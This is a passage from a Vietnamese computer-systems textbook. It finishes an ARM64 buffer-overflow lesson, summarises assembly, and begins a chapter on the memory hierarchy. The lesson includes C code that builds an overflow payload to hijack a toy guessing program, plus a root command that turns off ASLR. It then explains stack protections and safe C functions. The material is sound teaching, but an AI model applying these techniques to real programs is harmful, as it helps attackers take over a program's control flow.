<p>Quan sát thấy <code>endGame</code> bắt đầu tại địa chỉ <code>0x0000aaaaaaaaa8ec</code>. <a href="C9-ARM64/buffer_overflow.html#finalExploita64">Hình 4</a> minh họa một ví dụ <em>exploit</em> buộc <code>secret</code> chạy hàm <code>endGame</code>.</p>
<p><img src="C9-ARM64/_images/finalExploit.png" alt="exploit" /></p>
<p><strong>Hình 4.</strong> Một chuỗi mẫu có thể buộc <code>secret</code> thực thi hàm <code>endGame</code></p>
<p>Về cơ bản, chuỗi này gồm 32 byte dữ liệu rác, theo sau là <strong>return address</strong>. Một lần nữa, vì ARM64 theo mặc định là hệ thống <a href="C9-ARM64/../C4-Binary/byte_order.html#_integer_byte_order">little-endian</a>, các byte trong <strong>return address</strong> sẽ xuất hiện theo thứ tự đảo ngược.</p>
<p>Chương trình dưới đây minh họa cách một kẻ tấn công có thể tạo ra <em>exploit</em> này:</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;

char ebuff[]=
&quot;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x30&quot; /*first 10 bytes of junk*/
&quot;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x30&quot; /*next 10 bytes of junk*/
&quot;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x30&quot; /*following 10 bytes of junk*/
&quot;\x00\x00&quot; /*last 2 bytes of junk*/
&quot;\xec\xa8\xaa\xaa\xaa\xaa\x00\x00&quot; /*address of endGame (little endian)*/
;

int main(void) {
    int i;
    for (i = 0; i &lt; sizeof(ebuff); i++) { /*print each character*/
        printf(&quot;%c&quot;, ebuff[i]);
    }
    return 0;
}
</code></pre>
<p>Ký tự <code>\x</code> trước mỗi số cho biết số đó được định dạng dưới dạng biểu diễn <strong>hexadecimal</strong> (thập lục phân) của một ký tự. Sau khi định nghĩa <code>ebuff[]</code>, hàm <code>main</code> chỉ đơn giản in nó ra, từng ký tự một.<br />
Để tạo ra chuỗi byte tương ứng, hãy biên dịch và chạy chương trình này như sau:</p>
<pre><code>$ gcc -o genEx genEx.c
$ ./genEx &gt; exploit
</code></pre>
<p>Để dùng <code>exploit</code> làm đầu vào cho <code>scanf</code>, chỉ cần chạy <code>secret</code> với <code>exploit</code>.<br />
Để exploit hoạt động trên Raspberry Pi, hãy nhập các lệnh sau với quyền <strong>root</strong> (chúng ta sẽ giải thích sau ví dụ):</p>
<pre><code>$ sudo su
[sudo] password for pi:
root@pi# echo &quot;0&quot; &gt; /proc/sys/kernel/randomize_va_space
root@pi# exit
$
</code></pre>
<p>Lệnh <code>sudo su</code> đưa bạn vào chế độ <strong>root</strong> trên Raspberry Pi. Khi được yêu cầu nhập mật khẩu, hãy nhập mật khẩu của bạn (giả sử bạn có quyền root trên Raspberry Pi). Ngay khi nhập mật khẩu, các lệnh tiếp theo sẽ được gõ ở chế độ root. Lưu ý rằng dấu nhắc lệnh sẽ thay đổi khi ở chế độ root (trông như <code>root@pi#</code>).</p>
<p>Lệnh <code>echo</code> sẽ ghi đè nội dung của file <code>/proc/sys/kernel/randomize_va_space</code> bằng giá trị <code>0</code>. Tiếp theo, lệnh <code>exit</code> đưa bạn trở lại chế độ người dùng bình thường.</p>
<p>Bây giờ, nhập lệnh sau tại dấu nhắc:</p>
<pre><code>$ ./secret &lt; exploit
Enter secret number:
You are so wrong!
You win!
</code></pre>
<p>Chương trình in ra <code>&quot;You are so wrong!&quot;</code> vì chuỗi trong <code>exploit</code> <em>không</em> phải là số bí mật. Tuy nhiên, chương trình cũng in ra <code>&quot;You win!&quot;</code>.<br />
Hãy nhớ rằng mục tiêu của chúng ta là đánh lừa chương trình trả về giá trị <code>0</code>. Trong một hệ thống lớn hơn, nơi khái niệm “thành công” được theo dõi bởi một chương trình bên ngoài, điều quan trọng nhất thường là giá trị trả về của chương trình, chứ không phải những gì nó in ra.</p>
<p>Kiểm tra giá trị trả về:</p>
<pre><code>$ echo $?
0
</code></pre>
<p>Exploit của chúng ta đã thành công! Chúng ta đã thắng trò chơi.</p>
<h3 id="9106-bảo-vệ-chống-lại-buffer-overflow"><a class="header" href="#9106-bảo-vệ-chống-lại-buffer-overflow">9.10.6. Bảo vệ chống lại Buffer Overflow</a></h3>
<p>Ví dụ trên đã thay đổi <strong>control flow</strong> (luồng điều khiển) của chương trình thực thi <code>secret</code>, buộc nó trả về giá trị <code>0</code> (thành công). Chúng ta phải thực hiện điều này theo một cách khá “lắt léo” do các cơ chế bảo vệ stack mà ARM và GCC tích hợp để chống lại kiểu tấn công này.</p>
<p>Tuy nhiên, <strong>buffer overflow exploit</strong> có thể gây ra thiệt hại thực sự trên các hệ thống cũ. Một số hệ thống máy tính cũ thậm chí còn <em>thực thi</em> các byte từ bộ nhớ stack. Nếu kẻ tấn công đặt các byte tương ứng với lệnh assembly lên <em>call stack</em>, CPU sẽ diễn giải chúng như các lệnh <em>thật</em>, cho phép kẻ tấn công buộc CPU thực thi <em>bất kỳ code tùy ý nào mà họ muốn</em>.</p>
<p>May mắn thay, các hệ thống máy tính hiện đại áp dụng nhiều chiến lược để khiến việc khai thác buffer overflow trở nên khó khăn hơn:</p>
<ul>
<li>
<p><strong>Stack randomization</strong>: Hệ điều hành cấp phát địa chỉ bắt đầu của stack tại một vị trí ngẫu nhiên trong bộ nhớ stack, khiến vị trí/kích thước của <em>call stack</em> thay đổi giữa các lần chạy chương trình. Khi chúng ta ghi đè file <code>/proc/sys/kernel/randomize_va_space</code> bằng giá trị <code>0</code>, chúng ta đã tạm thời tắt stack randomization trên Raspberry Pi (file này sẽ trở lại giá trị ban đầu khi khởi động lại). Nếu không tắt stack randomization, nhiều máy chạy cùng một chương trình sẽ có địa chỉ stack khác nhau. Các hệ thống Linux hiện đại sử dụng stack randomization như một biện pháp chuẩn. Tuy nhiên, một kẻ tấn công kiên trì có thể brute force bằng cách thử nhiều địa chỉ khác nhau. Một mẹo phổ biến là dùng <strong>NOP sled</strong> (một dãy dài các lệnh NOP) trước đoạn code exploit. Lệnh NOP (<code>0x90</code>) không làm gì ngoài việc tăng <strong>program counter</strong> sang lệnh tiếp theo. Miễn là CPU bắt đầu thực thi ở đâu đó trong NOP sled, nó sẽ trượt đến đoạn code exploit phía sau. Bài viết <em>Smashing the Stack for Fun and Profit</em> của Aleph One⁶ mô tả chi tiết cơ chế này.</p>
</li>
<li>
<p><strong>Stack corruption detection</strong>: Một biện pháp khác là phát hiện khi stack bị hỏng. Các phiên bản GCC gần đây sử dụng một <strong>stack protector</strong> gọi là <strong>canary</strong> đóng vai trò như một “vệ sĩ” giữa buffer và các phần tử khác của stack. Canary là một giá trị được lưu ở vùng bộ nhớ không thể ghi, có thể so sánh với giá trị được đặt trên stack. Nếu canary “chết” trong quá trình chạy chương trình, chương trình sẽ biết mình đang bị tấn công và dừng lại với thông báo lỗi. Trong ví dụ này, chúng ta đã loại bỏ canary khỏi <code>secret</code> bằng cách biên dịch với cờ <code>-fno-stack-protector</code> trong GCC. Tuy nhiên, một kẻ tấn công tinh vi có thể thay thế canary trong quá trình tấn công để tránh bị phát hiện.</p>
</li>
<li>
<p><strong>Giới hạn vùng bộ nhớ thực thi</strong>: Trong biện pháp này, code thực thi chỉ được phép nằm ở một số vùng bộ nhớ nhất định. Nói cách khác, <em>call stack</em> sẽ không còn khả năng thực thi. Tuy nhiên, ngay cả biện pháp này cũng có thể bị vượt qua. Trong một cuộc tấn công sử dụng <strong>return-oriented programming</strong> (ROP), kẻ tấn công có thể “cherry-pick” các lệnh trong vùng bộ nhớ thực thi và nhảy từ lệnh này sang lệnh khác để xây dựng exploit. Có nhiều ví dụ nổi tiếng về kỹ thuật này trên mạng, đặc biệt là trong các trò chơi điện tử⁷.</p>
</li>
</ul>
<p>Tuy nhiên, <strong>tuyến phòng thủ tốt nhất luôn là lập trình viên</strong>.<br />
Để ngăn chặn các cuộc tấn công <strong>buffer overflow</strong> vào chương trình của bạn, hãy sử dụng các hàm C có <strong>length specifier</strong> (chỉ định độ dài) bất cứ khi nào có thể và bổ sung code để kiểm tra giới hạn mảng (<em>array bounds checking</em>). Điều quan trọng là mọi mảng được khai báo phải khớp với độ dài được chỉ định trong length specifier.</p>
<p><strong>Bảng 1</strong> liệt kê một số hàm C “xấu” thường dễ bị tấn công buffer overflow, và hàm “tốt” tương ứng nên dùng (giả sử <code>buf</code> được cấp phát 12 byte):</p>
<div class="table-wrapper"><table><thead><tr><th>Thay vì</th><th>Hãy dùng</th></tr></thead><tbody>
<tr><td><code>gets(buf)</code></td><td><code>fgets(buf, 12, stdin)</code></td></tr>
<tr><td><code>scanf(&quot;%s&quot;, buf)</code></td><td><code>scanf(&quot;%12s&quot;, buf)</code></td></tr>
<tr><td><code>strcpy(buf2, buf)</code></td><td><code>strncpy(buf2, buf, 12)</code></td></tr>
<tr><td><code>strcat(buf2, buf)</code></td><td><code>strncat(buf2, buf, 12)</code></td></tr>
<tr><td><code>sprintf(buf, &quot;%d&quot;, num)</code></td><td><code>snprintf(buf, 12, &quot;%d&quot;, num)</code></td></tr>
</tbody></table>
</div>
<p><strong>Bảng 1.</strong> Các hàm C với length specifier</p>
<p>Binary <code>secret2</code> (<a href="C9-ARM64/_attachments/secret2ARM64.tar.gz">secret2ARM64.tar.gz</a>) không còn chứa lỗ hổng buffer overflow. Hàm <code>playGame</code> trong binary mới này (<a href="C9-ARM64/_attachments/main2.c">main2.c</a>) như sau:</p>
<pre><code class="language-c">int playGame(void){
  int guess, secret, len, x=3;
  char buf[12];
  printf(&quot;Enter secret number:\n&quot;);
  scanf(&quot;%12s&quot;, buf); //length specifier được thêm ở đây!
  guess = atoi(buf);
  secret = getSecretCode();
  if (guess == secret)
    printf(&quot;You got it right!\n&quot;);
  else{
    printf(&quot;You are so wrong!\n&quot;);
    return 1;
  }
  printf(&quot;Enter the secret string to win:\n&quot;);
  scanf(&quot;%12s&quot;, buf); //length specifier được thêm ở đây!
  guess = calculateValue(buf, strlen(buf));
  if (guess != secret){
    printf(&quot;You lose!\n&quot;);
    return 2;
  }
  endGame();
  return 0;
}
</code></pre>
<p>Lưu ý rằng chúng ta đã thêm <strong>length specifier</strong> vào tất cả các lời gọi <code>scanf</code>, khiến hàm <code>scanf</code> dừng đọc đầu vào sau khi đọc đủ 12 byte đầu tiên. Chuỗi exploit giờ đây không còn làm hỏng chương trình:</p>
<pre><code>$ ./secret2 &lt; exploit
Enter secret number:
You are so wrong!
$ echo $?
1
</code></pre>
<p>Tất nhiên, bất kỳ ai có kỹ năng <strong>reverse engineering</strong> cơ bản vẫn có thể thắng trò chơi đoán số bằng cách phân tích code assembly. Nếu bạn chưa thử đánh bại chương trình bằng reverse engineering, chúng tôi khuyến khích bạn thử ngay bây giờ.</p>
<h3 id="tài-liệu-tham-khảo-5"><a class="header" href="#tài-liệu-tham-khảo-5">Tài liệu tham khảo</a></h3>
<ol>
<li>Mohit Kumar. <a href="https://thehackernews.com/2017/06/skype-crash-bug.html">Critical Skype Bug Lets Hackers Remotely Execute Malicious Code</a>. 2017.</li>
<li>Tamir Zahavi-Brunner. <a href="https://blog.zimperium.com/cve-2017-13253-buffer-overflow-multiple-android-drm-services/">CVE-2017-13253: Buffer overflow in multiple Android DRM services</a>. 2018.</li>
<li>Tom Spring. <a href="https://threatpost.com/google-patches-high-severity-browser-bug/128661/">Google Patches 'High Severity' Browser Bug</a>. 2017.</li>
<li>Christopher Kelty. <a href="https://limn.it/articles/the-morris-worm/">The Morris Worm</a> Limn Magazine, Issue 1. Systemic Risk. 2011.</li>
<li>David Auerbach. <a href="https://nplusonemag.com/issue-19/essays/chat-wars/">Chat Wars: Microsoft vs. AOL</a> NplusOne Magazine, Issue 19. Spring 2014.</li>
<li>Aleph One. <a href="http://insecure.org/stf/smashstack.html">Smashing the Stack for Fun and Profit</a>. 1996.</li>
<li>DotsAreCool. <a href="https://youtu.be/vAHXK2wut_I">Super Mario World Credit Warp</a> (Ví dụ Nintendo ROP). 2015.</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h2 id="10-những-điểm-rút-ra-chính-về-assembly"><a class="header" href="#10-những-điểm-rút-ra-chính-về-assembly">10. Những điểm rút ra chính về Assembly</a></h2>
<p>Phần này của cuốn sách đã trình bày những kiến thức cơ bản về assembly.<br />
Mặc dù ngày nay hầu hết mọi người lập trình bằng ngôn ngữ bậc cao, nhưng việc hiểu assembly giúp lập trình viên nắm rõ hơn chương trình và compiler của họ đang thực sự làm gì.<br />
Kiến thức về assembly cũng rất cần thiết cho những ai thiết kế phần mềm cho <strong>embedded systems</strong> (hệ thống nhúng) và các môi trường hạn chế tài nguyên, cũng như cho những người làm trong lĩnh vực phân tích lỗ hổng bảo mật.<br />
Các chương trong phần assembly của sách này đã bao quát <strong>64-bit Intel assembly (x86-64)</strong>, <strong>32-bit Intel Assembly (IA32)</strong> và <strong>64-bit ARM assembly (ARMv8-A)</strong>.</p>
<h3 id="các-đặc-điểm-chung"><a class="header" href="#các-đặc-điểm-chung">Các đặc điểm chung</a></h3>
<p>Bất kể bạn học loại assembly nào, vẫn có một số đặc điểm chung của <em>mọi</em> ngôn ngữ assembly đáng chú ý:</p>
<p><strong>ISA định nghĩa ngôn ngữ assembly</strong><br />
Ngôn ngữ assembly cụ thể trên một máy được xác định bởi <strong>instruction set architecture</strong> (ISA – kiến trúc tập lệnh) của máy đó.<br />
Để xác định kiến trúc nền tảng của một máy Linux, có thể dùng lệnh:</p>
<pre><code>uname -m
</code></pre>
<p><strong>Registers lưu trữ dữ liệu</strong><br />
Mỗi ISA định nghĩa một tập các <strong>register</strong> cơ bản mà CPU dùng để thao tác dữ liệu.<br />
Một số register là <em>general purpose</em> (đa dụng) và có thể chứa bất kỳ loại dữ liệu nào, trong khi một số khác là <em>special purpose</em> (chuyên dụng) và thường được compiler dành riêng cho các mục đích cụ thể (ví dụ: stack pointer, base pointer).<br />
Các register đa dụng có thể đọc và ghi, nhưng một số register chuyên dụng chỉ đọc (ví dụ: instruction pointer).</p>
<p><strong>Instructions xác định CPU có thể làm gì</strong><br />
ISA cũng định nghĩa một tập các <strong>instruction</strong> (lệnh) chỉ rõ các thao tác mà CPU có thể thực hiện.<br />
Mỗi lệnh có một <strong>operation code</strong> (opcode) xác định hành động của lệnh, và một hoặc nhiều <strong>operand</strong> (toán hạng) xác định dữ liệu được sử dụng.<br />
ISA mô tả các lệnh cụ thể cho việc di chuyển dữ liệu, các phép toán số học, điều kiện, rẽ nhánh và truy cập bộ nhớ.<br />
Những lệnh cốt lõi này thường được kết hợp để biểu diễn các cấu trúc dữ liệu phức tạp hơn như mảng, struct và ma trận.</p>
<p><strong>Program stack lưu trữ biến cục bộ của một hàm cụ thể</strong><br />
Compiler sử dụng stack (hoặc stack memory) trong không gian địa chỉ ảo của process để lưu dữ liệu tạm thời.<br />
Trên tất cả các hệ thống hiện đại, program stack phát triển về phía <strong>địa chỉ thấp hơn</strong>.<br />
Compiler dùng stack pointer và base pointer để xác định <strong>stack frame</strong> – vùng stack gắn với một hàm hoặc procedure cụ thể.<br />
Mỗi lần gọi hàm sẽ thêm một stack frame mới vào stack, xác định vùng stack của hàm callee.<br />
Stack frame của một hàm sẽ bị loại bỏ khi hàm đó trả về.<br />
Thông thường, stack pointer và base pointer sẽ trở lại giá trị ban đầu khi hàm kết thúc.<br />
Mặc dù điều này gợi ý rằng các biến cục bộ đã được “xóa” khỏi stack, nhưng dữ liệu cũ thường vẫn tồn tại dưới dạng giá trị rác, đôi khi gây ra các hành vi khó debug.<br />
Kẻ tấn công cũng có thể lợi dụng kiến thức về cách ISA quản lý stack để tạo ra các exploit nguy hiểm, như <strong>buffer overflow</strong>.</p>
<p><strong>Bảo mật</strong><br />
Mặc dù mọi hệ thống đều có thể bị tấn công bởi các lỗ hổng như buffer overflow, nhưng kiến trúc ARMv8-A ra đời sau đã có cơ hội học hỏi từ các lỗi bảo mật từng ảnh hưởng đến các kiến trúc Intel cũ hơn.<br />
Tuy nhiên, tuyến phòng thủ đầu tiên luôn là lập trình viên.<br />
Ngay cả khi có thêm các cơ chế bảo vệ, không ISA nào miễn nhiễm hoàn toàn với lỗi bảo mật.<br />
Khi lập trình bằng C, lập trình viên nên sử dụng <strong>length specifier</strong> bất cứ khi nào có thể để giảm nguy cơ lỗ hổng bảo mật do tràn bộ nhớ (xem <strong>Bảng 1</strong>).</p>
<div class="table-wrapper"><table><thead><tr><th>Thay vì:</th><th>Hãy dùng:</th></tr></thead><tbody>
<tr><td><code>gets(buf)</code></td><td><code>fgets(buf, 12, stdin)</code></td></tr>
<tr><td><code>scanf(&quot;%s&quot;, buf)</code></td><td><code>scanf(&quot;%12s&quot;, buf)</code></td></tr>
<tr><td><code>strcpy(buf2, buf)</code></td><td><code>strncpy(buf2, buf, 12)</code></td></tr>
<tr><td><code>strcat(buf2, buf)</code></td><td><code>strncat(buf2, buf, 12)</code></td></tr>
<tr><td><code>sprintf(buf, &quot;%d&quot;, num)</code></td><td><code>snprintf(buf, 12, &quot;%d&quot;, num)</code></td></tr>
</tbody></table>
</div>
<p><strong>Bảng 1.</strong> Các hàm C với length specifier.</p>
<h3 id="tài-liệu-đọc-thêm"><a class="header" href="#tài-liệu-đọc-thêm">Tài liệu đọc thêm</a></h3>
<p>Cuốn sách này chỉ giới thiệu một phần nhỏ về một số ngôn ngữ assembly phổ biến.<br />
Để hiểu sâu hơn về assembly, bạn nên tham khảo các tài liệu đặc tả ISA:</p>
<ul>
<li><a href="https://software.intel.com/en-us/articles/intel-sdm#architecture">Intel 64 and IA32 Manuals</a></li>
<li><a href="https://developer.arm.com/docs/den0024/a/preface">ARM Cortex-A Programmer's Guide</a></li>
</ul>
<p>Các tài nguyên miễn phí sau cũng hữu ích cho những ai muốn học assembly 32-bit:</p>
<ul>
<li><a href="http://csapp.cs.cmu.edu/3e/waside/waside-ia32.pdf">IA32 Programming Web Aside</a> (Randal Bryant và David O'Hallaron)</li>
<li><a href="https://azeria-labs.com/writing-arm-assembly-part-1/">32-bit ARM Assembly</a> (Azeria Labs)</li>
</ul>
<p>Các sách sau đây cũng có phần thảo luận chuyên sâu về assembly; tuy không miễn phí nhưng là nguồn tài liệu rất tốt:</p>
<ul>
<li>Intel systems: <a href="http://csapp.cs.cmu.edu/"><em>Computer Systems: A Programmer's Perspective</em></a> (Randal Bryant và David O'Hallaron)</li>
<li>ARMv8: <a href="https://textbooks.elsevier.com/web/product_details.aspx?isbn=9780128017333"><em>Computer Organization and Design</em></a> (David Patterson và John Hennessy)</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h2 id="11-lưu-trữ-và-hệ-phân-cấp-bộ-nhớ-storage-and-the-memory-hierarchy"><a class="header" href="#11-lưu-trữ-và-hệ-phân-cấp-bộ-nhớ-storage-and-the-memory-hierarchy">11. Lưu trữ và Hệ phân cấp bộ nhớ (Storage and the Memory Hierarchy)</a></h2>
<p>Mặc dù việc thiết kế và triển khai các <strong>algorithm</strong> (thuật toán) hiệu quả thường là yếu tố <em>quan trọng nhất</em> để viết các chương trình có hiệu năng cao, vẫn còn một yếu tố khác — thường bị bỏ qua — có thể tác động lớn đến hiệu suất: <strong>memory</strong> (bộ nhớ).<br />
Có thể bạn sẽ ngạc nhiên khi biết rằng hai thuật toán có <strong>asymptotic performance</strong> (hiệu năng tiệm cận — số bước trong trường hợp xấu nhất) giống nhau, chạy trên cùng một dữ liệu đầu vào, lại có thể cho hiệu năng thực tế rất khác nhau do cách tổ chức phần cứng mà chúng chạy trên đó.<br />
Sự khác biệt này thường bắt nguồn từ cách các thuật toán truy cập bộ nhớ, đặc biệt là vị trí lưu trữ dữ liệu và kiểu mẫu (pattern) truy cập dữ liệu. Các kiểu mẫu này được gọi là <strong>memory locality</strong> (tính cục bộ bộ nhớ), và để đạt hiệu năng tốt nhất, kiểu truy cập của chương trình cần phù hợp với cách bố trí bộ nhớ của phần cứng.</p>
<p>Ví dụ, hãy xem xét hai biến thể của một hàm tính trung bình các giá trị trong ma trận <em>N</em>×<em>N</em>, như minh họa trong <a href="C11-MemHierarchy/index.html#TabMatrixVersions">Bảng 1</a>.<br />
Mặc dù cả hai phiên bản đều truy cập cùng số lượng vị trí bộ nhớ như nhau (N²), nhưng code bên trái chạy nhanh hơn khoảng 5 lần trên hệ thống thực tế so với code bên phải.<br />
Sự khác biệt đến từ cách chúng truy cập các vị trí bộ nhớ đó. Ở cuối chương này, chúng ta sẽ phân tích ví dụ này bằng công cụ <strong>Cachegrind</strong> (công cụ phân tích hiệu năng cache).</p>
<h4 id="averagemat_v1"><a class="header" href="#averagemat_v1">averageMat_v1</a></h4>
<pre><code class="language-c">float averageMat_v1(int **mat, int n) {
    int i, j, total = 0;
    for (i = 0; i &lt; n; i++) {
        for (j = 0; j &lt; n; j++) {
            // Note indexing: [i][j]
            total += mat[i][j];
        }
    }
    return (float) total / (n * n);
}
</code></pre>
<h4 id="averagemat_v2"><a class="header" href="#averagemat_v2">averageMat_v2</a></h4>
<pre><code class="language-c">float averageMat_v2(int **mat, int n) {
    int i, j, total = 0;
    for (i = 0; i &lt; n; i++) {
        for (j = 0; j &lt; n; j++) {
            // Note indexing: [j][i]
            total += mat[j][i];
        }
    }
    return (float) total / (n * n);
}
</code></pre>
<p><strong>Bảng 1.</strong> Hai phiên bản của một hàm truy cập mọi phần tử của ma trận <em>N</em>×<em>N</em>. Chúng chỉ khác nhau ở cách đánh chỉ số (indexing) khi truy cập bộ nhớ.</p>
<p>Các vị trí lưu trữ như <strong>register</strong>, <strong>CPU cache</strong>, <strong>main memory</strong> (bộ nhớ chính), và <strong>file</strong> trên <strong>disk</strong> (đĩa) có thời gian truy cập, tốc độ truyền và dung lượng lưu trữ rất khác nhau.<br />
Khi lập trình một ứng dụng hiệu năng cao, điều quan trọng là phải xem xét dữ liệu được lưu ở đâu và chương trình truy cập dữ liệu từ thiết bị đó với tần suất như thế nào.<br />
Ví dụ, việc truy cập một ổ đĩa chậm chỉ một lần khi chương trình khởi động thường không phải vấn đề lớn. Nhưng nếu truy cập ổ đĩa thường xuyên, chương trình sẽ bị chậm đáng kể.</p>
<p>Chương này mô tả đặc điểm của nhiều loại thiết bị bộ nhớ khác nhau và cách chúng được tổ chức trong một máy tính cá nhân hiện đại.<br />
Với bối cảnh đó, chúng ta sẽ thấy cách kết hợp nhiều loại thiết bị bộ nhớ để khai thác <strong>locality</strong> (tính cục bộ) trong các mẫu truy cập bộ nhớ điển hình của chương trình.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="111-hệ-phân-cấp-bộ-nhớ-the-memory-hierarchy"><a class="header" href="#111-hệ-phân-cấp-bộ-nhớ-the-memory-hierarchy">11.1. Hệ phân cấp bộ nhớ (The Memory Hierarchy)</a></h2>
<p>Khi chúng ta tìm hiểu về các thiết bị lưu trữ trong máy tính hiện đại, một mô hình chung xuất hiện: các thiết bị có dung lượng lớn hơn thì lại có hiệu năng thấp hơn. Nói cách khác, hệ thống sử dụng cả những thiết bị nhanh và những thiết bị có khả năng lưu trữ lượng dữ liệu lớn, nhưng không có thiết bị nào vừa nhanh vừa lưu trữ được nhiều. Sự đánh đổi giữa hiệu năng và dung lượng này được gọi là <strong>memory hierarchy</strong> (hệ phân cấp bộ nhớ), và <strong>Hình 1</strong> minh họa trực quan hệ phân cấp này.</p>
<p>Các thiết bị lưu trữ cũng có sự đánh đổi tương tự giữa chi phí và mật độ lưu trữ: thiết bị nhanh hơn thì đắt hơn, cả về chi phí trên mỗi byte và chi phí vận hành (ví dụ: tiêu thụ năng lượng).<br />
Chẳng hạn, mặc dù <strong>cache</strong> mang lại hiệu năng tuyệt vời, nhưng chi phí (và thách thức sản xuất) để chế tạo một CPU có cache đủ lớn để loại bỏ nhu cầu dùng <strong>main memory</strong> là điều không khả thi.<br />
Các hệ thống thực tế phải kết hợp nhiều loại thiết bị để đáp ứng yêu cầu về hiệu năng và dung lượng của chương trình, và một hệ thống điển hình ngày nay thường tích hợp hầu hết, nếu không muốn nói là tất cả, các thiết bị được mô tả trong <strong>Hình 1</strong>.</p>
<p><img src="C11-MemHierarchy/_images/MemoryHierarchy.png" alt="In order, from (high performance, high cost, low capacity) to (low performance, low cost, high capacity): registers, cache, main memory, flash disk, traditional disk, and remote secondary storage." /></p>
<p><strong>Hình 1.</strong> Hệ phân cấp bộ nhớ</p>
<p>Thực tế của hệ phân cấp bộ nhớ là điều không mấy dễ chịu đối với lập trình viên, những người thường muốn không phải bận tâm đến tác động hiệu năng của vị trí dữ liệu được lưu trữ.<br />
Ví dụ, khi khai báo một biến số nguyên <em>trong hầu hết các ứng dụng</em>, lập trình viên lý tưởng sẽ không phải lo lắng về sự khác biệt giữa dữ liệu được lưu trong cache hay trong main memory.<br />
Việc yêu cầu lập trình viên quản lý chi tiết loại bộ nhớ mà mỗi biến chiếm dụng sẽ là một gánh nặng, mặc dù đôi khi điều này có thể đáng làm đối với một số đoạn code nhỏ, quan trọng về hiệu năng.</p>
<p>Lưu ý rằng <strong>Hình 1</strong> phân loại <em>cache</em> như một thực thể duy nhất, nhưng hầu hết các hệ thống đều có nhiều cấp cache tạo thành một hệ phân cấp nhỏ hơn bên trong.<br />
Ví dụ, CPU thường tích hợp một <strong>level one (L1) cache</strong> rất nhỏ và nhanh, nằm khá gần <strong>ALU</strong> (Arithmetic Logic Unit), và một <strong>level two (L2) cache</strong> lớn hơn nhưng chậm hơn, nằm xa hơn.<br />
Nhiều CPU đa nhân (<strong>multicore CPU</strong>) còn chia sẻ dữ liệu giữa các nhân thông qua một <strong>level three (L3) cache</strong> lớn hơn.<br />
Mặc dù sự khác biệt giữa các cấp cache có thể quan trọng đối với các ứng dụng nhạy cảm về hiệu năng, cuốn sách này sẽ chỉ xem xét một cấp cache duy nhất để đơn giản hóa.</p>
<p>Mặc dù chương này chủ yếu tập trung vào việc di chuyển dữ liệu giữa <strong>register</strong>, <strong>CPU cache</strong> và <strong>main memory</strong>, <a href="C11-MemHierarchy/devices.html#_storage_devices">phần tiếp theo</a> sẽ mô tả các thiết bị lưu trữ phổ biến trong toàn bộ <strong>memory hierarchy</strong>.<br />
Chúng ta sẽ tìm hiểu về ổ đĩa và vai trò của chúng trong bức tranh tổng thể của quản lý bộ nhớ ở <strong>Chương 13</strong>, trong phần thảo luận về <a href="C11-MemHierarchy/../C13-OS/vm.html#_virtual_memory">virtual memory</a>.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="112-thiết-bị-lưu-trữ-storage-devices"><a class="header" href="#112-thiết-bị-lưu-trữ-storage-devices">11.2. Thiết bị lưu trữ (Storage Devices)</a></h2>
<p>Các nhà thiết kế hệ thống phân loại các thiết bị trong <a href="C11-MemHierarchy/mem_hierarchy.html#_the_memory_hierarchy">memory hierarchy</a> (hệ phân cấp bộ nhớ) dựa trên cách chương trình truy cập dữ liệu của chúng.<br />
<strong>Primary storage</strong> (bộ nhớ chính) là các thiết bị có thể được truy cập trực tiếp bởi một chương trình đang chạy trên CPU. Nói cách khác, các <strong>assembly instruction</strong> (lệnh hợp ngữ) của CPU code hóa chính xác vị trí dữ liệu mà lệnh cần lấy. Ví dụ về <strong>primary storage</strong> bao gồm <strong>CPU register</strong> và <strong>main memory</strong> (RAM), mà các lệnh assembly tham chiếu trực tiếp (ví dụ, trong IA32 assembly là <code>%reg</code> và <code>(%reg)</code> tương ứng).</p>
<p>Ngược lại, các lệnh CPU không thể trực tiếp tham chiếu đến <strong>secondary storage</strong> (bộ nhớ phụ). Để truy cập nội dung của một thiết bị secondary storage, chương trình trước tiên phải yêu cầu thiết bị sao chép dữ liệu của nó vào primary storage (thường là bộ nhớ chính). Các loại secondary storage quen thuộc nhất là các thiết bị đĩa như <strong>hard disk drive (HDD)</strong> và <strong>solid-state drive (SSD)</strong>, vốn lưu trữ dữ liệu tệp một cách lâu dài. Các ví dụ khác bao gồm <strong>floppy disk</strong>, <strong>magnetic tape cartridge</strong> (băng từ), hoặc thậm chí <strong>remote file server</strong> (máy chủ tệp từ xa).</p>
<p>Ngay cả khi bạn chưa từng nghĩ đến sự phân biệt giữa primary và secondary storage theo cách này, rất có thể bạn đã gặp sự khác biệt của chúng khi lập trình. Ví dụ, sau khi khai báo và gán giá trị cho các biến thông thường (primary storage), chương trình có thể ngay lập tức sử dụng chúng trong các phép toán số học. Khi làm việc với dữ liệu tệp (secondary storage), chương trình phải <a href="C11-MemHierarchy/../C2-C_depth/IO.html#_file_inputoutput">đọc giá trị từ tệp vào các biến trong bộ nhớ</a> trước khi có thể truy cập chúng.</p>
<p>Ngoài ra, còn có một số tiêu chí quan trọng khác để phân loại thiết bị bộ nhớ dựa trên đặc điểm hiệu năng và dung lượng. Ba thước đo quan trọng nhất là:</p>
<ul>
<li><strong>Capacity</strong> (dung lượng): Lượng dữ liệu mà thiết bị có thể lưu trữ. Thường được đo bằng byte.</li>
<li><strong>Latency</strong> (độ trễ): Thời gian cần để thiết bị phản hồi dữ liệu sau khi nhận lệnh thực hiện một thao tác truy xuất dữ liệu. Thường được đo bằng phần của giây (ví dụ: millisecond hoặc nanosecond) hoặc số chu kỳ CPU.</li>
<li><strong>Transfer rate</strong> (tốc độ truyền): Lượng dữ liệu có thể được di chuyển giữa thiết bị và bộ nhớ chính trong một khoảng thời gian. <strong>Transfer rate</strong> còn được gọi là <strong>throughput</strong> (băng thông) và thường được đo bằng byte/giây.</li>
</ul>
<p>Khám phá các loại thiết bị trong một máy tính hiện đại cho thấy sự chênh lệch rất lớn về hiệu năng giữa các thiết bị theo cả ba thước đo trên. Sự khác biệt này chủ yếu đến từ hai yếu tố: <em>khoảng cách</em> và <em>công nghệ</em> được sử dụng để chế tạo thiết bị.</p>
